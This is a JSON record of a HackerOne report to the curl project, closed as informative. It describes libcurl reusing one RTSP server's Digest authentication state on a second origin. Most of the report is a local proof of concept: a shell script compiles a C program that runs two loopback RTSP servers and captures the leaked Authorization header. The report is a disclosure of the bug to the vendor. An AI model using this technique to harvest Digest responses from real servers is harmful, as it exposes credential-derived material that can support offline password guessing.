@@ -1,0 +1,111 @@
+{
+  "id": 3776535,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzc2NTM1",
+  "url": "https://hackerone.com/reports/3776535",
+  "title": "RTSP Digest auth state leaks across origins on reused libcurl easy handle",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2026-06-02T09:49:31.247Z",
+  "submitted_at": "2026-06-02T09:49:32.044Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hamaowo",
+    "url": "/hamaowo",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-05T05:50:15.452Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-03T08:02:03.161Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nWhen a reused libcurl easy handle first authenticates to one RTSP origin with Digest authentication and is then switched to a different RTSP origin, libcurl can send the old origin's Digest authentication state to the new origin. The second RTSP server does not need to send a `WWW-Authenticate:` challenge: its first request can already contain an `Authorization: Digest` header using the first server's `realm`, `nonce`, `cnonce`, and incremented nonce count. The application can follow the documented RTSP guidance and clear `CURLOPT_RTSP_SESSION_ID`; the stale Digest state is independent from the RTSP session id. This leaks credential-derived authentication material across an origin/trust boundary. The issue is analogous to a cross-host/cross-proxy Digest auth state leak, but in the RTSP host authentication path.\n\n### Affected version\n\nReproduced locally on current master:\n\n```text\ncurl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libpsl/0.21.2\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli HSTS HTTPS-proxy IPv6 Largefile libz PSL SSL SSLS-EXPORT threadsafe TLS-SRP UnixSockets zstd\n```\n\nSource revision:\n\n```text\nba600296d2a1d8a4e53a36eb4bd30c1f0d0152cc\nrc-8_21_0-1-14-gba600296d2\n```\n\nPlatform: Linux x86_64.\n\n### Root cause\n\nRTSP requests use the HTTP authentication machinery:\n\n```c\n/* lib/rtsp.c */\nresult = Curl_http_output_auth(data, conn, p_request, HTTPREQ_GET,\n                               p_stream_uri, NULL, FALSE);\n```\n\nThe host Digest output path uses `data->state.digest`:\n\n```c\n/* lib/http_digest.c */\ndigest = &data->state.digest;\n...\nhave_chlg = !!digest->nonce;\n...\n*allocuserpwd = curl_maprintf(\"%sAuthorization: Digest %s\\r\\n\",\n                              proxy ? \"Proxy-\" : \"\", response);\n```\n\nAt the start of a new `easy_perform()`, libcurl clears the transfer's initial origin and resets auth method selection, but it does not clear the host Digest challenge state:\n\n```c\n/* lib/transfer.c */\nCurl_peer_unlink(&data->state.initial_origin);\n...\ndata->state.authhost.want = data->set.httpauth;\n```\n\nBy contrast, the HTTP redirect path explicitly clears host Digest state when the redirect crosses origins:\n\n```c\n/* lib/http.c */\nbool same_origin = Curl_url_same_origin(u, data->state.uh);\nif(!same_origin)\n  Curl_auth_digest_cleanup(&data->state.digest);\n```\n\nThat redirect cleanup is the expected security boundary: a Digest challenge belongs to a protection space/origin and should not be reused for an unrelated origin. The reused-handle RTSP path misses equivalent cleanup.\n\n### Why this is not RTSP session-id misuse\n\n`CURLOPT_RTSP_SESSION_ID.md` warns that an application may need to set or clear the RTSP Session ID when changing the URL origin on a reused easy handle. The PoC below does exactly that:\n\n```c\ncurl_easy_setopt(curl, CURLOPT_RTSP_SESSION_ID, NULL);\n```\n\nThe leaked value is not the RTSP session id. It is an `Authorization: Digest` header generated from stale `data->state.digest` state (`realm`, `nonce`, `cnonce`, `nc`) that was established by the previous origin.\n\n### Why this is not just sticky `CURLOPT_USERPWD`\n\nlibcurl options are sticky, and keeping credentials configured on a reused handle is normal libcurl behavior. The issue is not merely that credentials remain configured. If the new RTSP server wants Digest authentication, it should first send its own `WWW-Authenticate: Digest ...` challenge and libcurl should generate a response for that challenge. In the vulnerable behavior, the new server sends no challenge at all and still receives an `Authorization: Digest` header built from the previous server's `realm` and `nonce`.\n\n## Steps To Reproduce\n\nRun the following from the curl source tree after building libcurl. The PoC is fully inline: it writes a temporary C file, starts two local RTSP servers from that program, resolves `rtsp-a.example` and `rtsp-b.example` to loopback with `CURLOPT_RESOLVE`, performs two RTSP `DESCRIBE` transfers on the same easy handle, and prints the requests captured by both servers.\n\nThe default compile settings match the local build used for reproduction: `build-asan-ssls/lib/libcurl-d.so`. If your build directory or library name differs, set `LIBCURL_LIBDIR` and `LIBCURL_LIB` before running the block.\n\n```sh\nset -eu\n\ntmpdir=\"$(mktemp -d)\"\ntrap 'rm -rf \"$tmpdir\"' EXIT\n\ncat > \"$tmpdir/rtsp_digest_cross_origin.c\" <<'EOF'\n#include <arpa/inet.h>\n#include <curl/curl.h>\n#include <errno.h>\n#include <netinet/in.h>\n#include <pthread.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/time.h>\n#include <unistd.h>\n\nstruct request_log {\n  char first_line[256];\n  char auth[2048];\n  int cseq;\n};\n\nstruct server {\n  int listen_fd;\n  unsigned short port;\n  int id;\n  pthread_t tid;\n  struct request_log reqs[3];\n  size_t req_count;\n  char error[256];\n};\n\nstatic ssize_t xrecv(int fd, void *buf, size_t len)\n{\n  for(;;) {\n    ssize_t n = recv(fd, buf, len, 0);\n    if(n < 0 && errno == EINTR)\n      continue;\n    return n;\n  }\n}\n\nstatic int header_int(const char *headers, const char *name)\n{\n  const size_t namelen = strlen(name);\n  const char *p = headers;\n\n  while(*p) {\n    const char *e = strstr(p, \"\\r\\n\");\n    size_t n = e ? (size_t)(e - p) : strlen(p);\n    if(n > namelen && !strncasecmp(p, name, namelen) && p[namelen] == ':')\n      return atoi(p + namelen + 1);\n    if(!e)\n      break;\n    p = e + 2;\n  }\n  return 1;\n}\n\nstatic void header_value(const char *headers, const char *name,\n                         char *out, size_t outlen)\n{\n  const size_t namelen = strlen(name);\n  const char *p = headers;\n  out[0] = 0;\n\n  while(*p) {\n    const char *e = strstr(p, \"\\r\\n\");\n    size_t n = e ? (size_t)(e - p) : strlen(p);\n    if(n > namelen && !strncasecmp(p, name, namelen) && p[namelen] == ':') {\n      size_t vlen;\n      const char *v = p + namelen + 1;\n      while(*v == ' ' || *v == '\\t')\n        v++;\n      vlen = e ? (size_t)(e - v) : strlen(v);\n      if(vlen >= outlen)\n        vlen = outlen - 1;\n      memcpy(out, v, vlen);\n      out[vlen] = 0;\n      return;\n    }\n    if(!e)\n      break;\n    p = e + 2;\n  }\n}\n\nstatic bool read_request(int fd, struct request_log *log,\n                         char *err, size_t errlen)\n{\n  char buf[8192];\n  size_t used = 0;\n  char *end;\n\n  memset(log, 0, sizeof(*log));\n  for(;;) {\n    ssize_t n;\n    if(used == sizeof(buf) - 1) {\n      snprintf(err, errlen, \"request too large\");\n      return false;\n    }\n    n = xrecv(fd, buf + used, 1);\n    if(n <= 0) {\n      snprintf(err, errlen, \"recv failed/closed\");\n      return false;\n    }\n    used += (size_t)n;\n    buf[used] = 0;\n    end = strstr(buf, \"\\r\\n\\r\\n\");\n    if(end)\n      break;\n  }\n\n  {\n    char *line_end = strstr(buf, \"\\r\\n\");\n    size_t n = line_end ? (size_t)(line_end - buf) : strlen(buf);\n    if(n >= sizeof(log->first_line))\n      n = sizeof(log->first_line) - 1;\n    memcpy(log->first_line, buf, n);\n    log->first_line[n] = 0;\n  }\n  log->cseq = header_int(buf, \"CSeq\");\n  header_value(buf, \"Authorization\", log->auth, sizeof(log->auth));\n  return true;\n}\n\nstatic bool send_all(int fd, const char *buf, size_t len)\n{\n  while(len) {\n    ssize_t n = send(fd, buf, len, 0);\n    if(n < 0 && errno == EINTR)\n      continue;\n    if(n <= 0)\n      return false;\n    buf += n;\n    len -= (size_t)n;\n  }\n  return true;\n}\n\nstatic bool send_resp(int fd, int status, int cseq, const char *extra)\n{\n  char resp[2048];\n  int len = snprintf(resp, sizeof(resp),\n                     \"RTSP/1.0 %d %s\\r\\n\"\n                     \"CSeq: %d\\r\\n\"\n                     \"%s\"\n                     \"Content-Length: 0\\r\\n\"\n                     \"\\r\\n\",\n                     status, status == 401 ? \"Unauthorized\" : \"OK\",\n                     cseq, extra ? extra : \"\");\n  return len > 0 && (size_t)len < sizeof(resp) &&\n         send_all(fd, resp, (size_t)len);\n}\n\nstatic int make_server(struct server *s, int id)\n{\n  struct sockaddr_in addr;\n  socklen_t len = sizeof(addr);\n  int one = 1;\n\n  memset(s, 0, sizeof(*s));\n  s->id = id;\n  s->listen_fd = socket(AF_INET, SOCK_STREAM, 0);\n  if(s->listen_fd < 0)\n    return -1;\n  setsockopt(s->listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));\n  memset(&addr, 0, sizeof(addr));\n  addr.sin_family = AF_INET;\n  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n  addr.sin_port = 0;\n  if(bind(s->listen_fd, (struct sockaddr *)&addr, sizeof(addr)) ||\n     listen(s->listen_fd, 2) ||\n     getsockname(s->listen_fd, (struct sockaddr *)&addr, &len))\n    return -1;\n  s->port = ntohs(addr.sin_port);\n  return 0;\n}\n\nstatic void *server_thread(void *arg)\n{\n  struct server *s = arg;\n  struct timeval tv;\n  int fd = accept(s->listen_fd, NULL, NULL);\n\n  if(fd < 0) {\n    snprintf(s->error, sizeof(s->error), \"accept failed\");\n    return NULL;\n  }\n  tv.tv_sec = 10;\n  tv.tv_usec = 0;\n  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));\n\n  if(s->id == 1) {\n    if(!read_request(fd, &s->reqs[s->req_count++], s->error,\n                     sizeof(s->error)))\n      goto out;\n    if(!send_resp(fd, 401, s->reqs[0].cseq,\n                  \"WWW-Authenticate: Digest realm=\\\"realm-A\\\", \"\n                  \"nonce=\\\"nonce-A\\\", qop=\\\"auth\\\"\\r\\n\")) {\n      snprintf(s->error, sizeof(s->error), \"send 401 failed\");\n      goto out;\n    }\n    if(!read_request(fd, &s->reqs[s->req_count++], s->error,\n                     sizeof(s->error)))\n      goto out;\n    if(!send_resp(fd, 200, s->reqs[1].cseq, NULL))\n      snprintf(s->error, sizeof(s->error), \"send 200 failed\");\n  }\n  else {\n    if(!read_request(fd, &s->reqs[s->req_count++], s->error,\n                     sizeof(s->error)))\n      goto out;\n    if(!send_resp(fd, 200, s->reqs[0].cseq, NULL))\n      snprintf(s->error, sizeof(s->error), \"send B 200 failed\");\n  }\n\nout:\n  close(fd);\n  close(s->listen_fd);\n  return NULL;\n}\n\nstatic size_t discard_cb(char *ptr, size_t size, size_t nmemb, void *userdata)\n{\n  (void)ptr;\n  (void)userdata;\n  return size * nmemb;\n}\n\nint main(void)\n{\n  struct server a, b;\n  CURL *curl;\n  CURLcode rc1, rc2;\n  char url_a[128], url_b[128];\n  char resolve_a[128], resolve_b[128];\n  struct curl_slist *resolve = NULL;\n\n  if(make_server(&a, 1) || make_server(&b, 2)) {\n    perror(\"make_server\");\n    return 2;\n  }\n  pthread_create(&a.tid, NULL, server_thread, &a);\n  pthread_create(&b.tid, NULL, server_thread, &b);\n\n  snprintf(url_a, sizeof(url_a), \"rtsp://rtsp-a.example:%u/a\", a.port);\n  snprintf(url_b, sizeof(url_b), \"rtsp://rtsp-b.example:%u/b\", b.port);\n  snprintf(resolve_a, sizeof(resolve_a), \"rtsp-a.example:%u:127.0.0.1\",\n           a.port);\n  snprintf(resolve_b, sizeof(resolve_b), \"rtsp-b.example:%u:127.0.0.1\",\n           b.port);\n  resolve = curl_slist_append(resolve, resolve_a);\n  resolve = curl_slist_append(resolve, resolve_b);\n  if(!resolve) {\n    fprintf(stderr, \"curl_slist_append failed\\n\");\n    return 2;\n  }\n\n  curl_global_init(CURL_GLOBAL_ALL);\n  curl = curl_easy_init();\n  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_cb);\n  curl_easy_setopt(curl, CURLOPT_PROXY, \"\");\n  curl_easy_setopt(curl, CURLOPT_RESOLVE, resolve);\n  curl_easy_setopt(curl, CURLOPT_HTTPAUTH, (long)CURLAUTH_DIGEST);\n  curl_easy_setopt(curl, CURLOPT_USERPWD, \"rtspuser:rtspsecret\");\n  curl_easy_setopt(curl, CURLOPT_RTSP_REQUEST, CURL_RTSPREQ_DESCRIBE);\n  curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 5000L);\n\n  curl_easy_setopt(curl, CURLOPT_URL, url_a);\n  curl_easy_setopt(curl, CURLOPT_RTSP_STREAM_URI, url_a);\n  rc1 = curl_easy_perform(curl);\n\n  curl_easy_setopt(curl, CURLOPT_RTSP_SESSION_ID, NULL);\n  curl_easy_setopt(curl, CURLOPT_URL, url_b);\n  curl_easy_setopt(curl, CURLOPT_RTSP_STREAM_URI, url_b);\n  rc2 = curl_easy_perform(curl);\n\n  curl_easy_cleanup(curl);\n  curl_slist_free_all(resolve);\n  curl_global_cleanup();\n  pthread_join(a.tid, NULL);\n  pthread_join(b.tid, NULL);\n\n  printf(\"A rc=%d reqs=%zu err=%s\\n\", (int)rc1, a.req_count, a.error);\n  for(size_t i = 0; i < a.req_count; i++)\n    printf(\"A%zu line=[%s] auth=[%s]\\n\", i + 1,\n           a.reqs[i].first_line, a.reqs[i].auth);\n  printf(\"B rc=%d reqs=%zu err=%s\\n\", (int)rc2, b.req_count, b.error);\n  for(size_t i = 0; i < b.req_count; i++)\n    printf(\"B%zu line=[%s] auth=[%s]\\n\", i + 1,\n           b.reqs[i].first_line, b.reqs[i].auth);\n\n  if(b.req_count && strstr(b.reqs[0].auth, \"Digest\") &&\n     strstr(b.reqs[0].auth, \"nonce-A\")) {\n    puts(\"verdict: VULNERABLE - B got preemptive Digest auth using A nonce\");\n    return 1;\n  }\n  puts(\"verdict: not reproduced\");\n  return 0;\n}\nEOF\n\nLIBCURL_LIBDIR=\"${LIBCURL_LIBDIR:-build-asan-ssls/lib}\"\nLIBCURL_LIB=\"${LIBCURL_LIB:-curl-d}\"\ncase \"$LIBCURL_LIBDIR\" in\n  /*) libcurl_rpath=\"$LIBCURL_LIBDIR\" ;;\n  *) libcurl_rpath=\"$PWD/$LIBCURL_LIBDIR\" ;;\nesac\n\ncc ${CFLAGS:--g -O0 -fsanitize=address} -Iinclude \\\n  \"$tmpdir/rtsp_digest_cross_origin.c\" \\\n  -L\"$LIBCURL_LIBDIR\" -Wl,-rpath,\"$libcurl_rpath\" \\\n  -l\"$LIBCURL_LIB\" -pthread \\\n  -o \"$tmpdir/rtsp_digest_cross_origin\"\n\nset +e\nASAN_OPTIONS=\"${ASAN_OPTIONS:-detect_leaks=0}\" \\\nLD_LIBRARY_PATH=\"$libcurl_rpath${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\" \\\n  \"$tmpdir/rtsp_digest_cross_origin\"\nrc=$?\nset -e\n\nif [ \"$rc\" -eq 1 ]; then\n  echo \"PoC detected the vulnerable behavior.\"\nelse\n  echo \"PoC did not reproduce the vulnerable behavior. exit=$rc\"\n  exit 1\nfi\n```\n\n### Expected result\n\nServer B should not receive an `Authorization: Digest` header on its first request. It has a different RTSP origin and it did not send a `WWW-Authenticate: Digest` challenge. At most, libcurl should authenticate to B only after B sends its own challenge.\n\n### Actual result\n\nServer B receives an `Authorization: Digest` header using server A's Digest state. Example output from the local reproduction:\n\n```text\nA rc=0 reqs=2 err=\nA1 line=[DESCRIBE rtsp://rtsp-a.example:46421/a RTSP/1.0] auth=[]\nA2 line=[DESCRIBE rtsp://rtsp-a.example:46421/a RTSP/1.0] auth=[Digest username=\"rtspuser\", realm=\"realm-A\", nonce=\"nonce-A\", uri=\"rtsp://rtsp-a.example:46421/a\", cnonce=\"k7sl9+6WhMv+q3wQ\", nc=00000001, qop=auth, response=\"0546daf7ab43a83ff2b253f8922b2719\"]\nB rc=0 reqs=1 err=\nB1 line=[DESCRIBE rtsp://rtsp-b.example:45543/b RTSP/1.0] auth=[Digest username=\"rtspuser\", realm=\"realm-A\", nonce=\"nonce-A\", uri=\"rtsp://rtsp-b.example:45543/b\", cnonce=\"k7sl9+6WhMv+q3wQ\", nc=00000002, qop=auth, response=\"b5f2e94b27df51f400b5e167aa99769a\"]\nverdict: VULNERABLE - B got preemptive Digest auth using A nonce\nPoC detected the vulnerable behavior.\n```\n\n## Impact\n\nAn attacker controlling a later RTSP origin can receive credential-derived Digest authentication material that belongs to a previous RTSP origin's authentication state. The leaked header contains the username, previous origin's `realm` and `nonce`, libcurl's `cnonce`, incremented nonce count, target URI, qop, and Digest `response` value. This is not a plaintext password leak, but it is still sensitive authentication material crossing to a different host/trust boundary. Depending on password strength and Digest algorithm, it can support offline password guessing; in deployments with loose nonce/protection-space validation, it may also create replay or authentication-confusion risk. At minimum, it exposes request authentication metadata to an origin that never challenged for it and should not receive it.",
+  "weakness": {
+    "id": 113,
+    "name": "Information Exposure Through Sent Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
